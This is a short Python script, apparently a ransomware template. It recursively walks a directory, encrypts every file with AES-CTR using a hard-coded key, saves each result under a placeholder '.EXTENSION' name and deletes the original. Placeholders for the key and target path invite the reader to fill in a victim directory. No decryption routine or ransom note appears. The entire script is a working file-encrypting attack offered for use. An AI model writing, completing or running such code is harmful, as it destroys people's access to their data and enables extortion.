import os
import pyaes

def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                file_data = f.read()

            aes = pyaes.AESModeOfOperationCTR(key.encode())

            # Encrypt file data
            crypto_data = aes.encrypt(file_data)

            # Add your extension to the original file
            new_file_name = file + ".EXTENSION"

            # Write encrypted data back to file with new name
            with open(os.path.join(root, new_file_name), "wb") as f:
                f.write(crypto_data)

            # Remove original file
            os.remove(file_path)

# Your encryption key
key = "INSERT KEY HERE"

# Directory to encrypt
directory_to_encrypt = 'INSERT DIRECTORY PATH HERE'

# Encrypt files recursively in the directory
encrypt_files_in_directory(directory_to_encrypt, key)
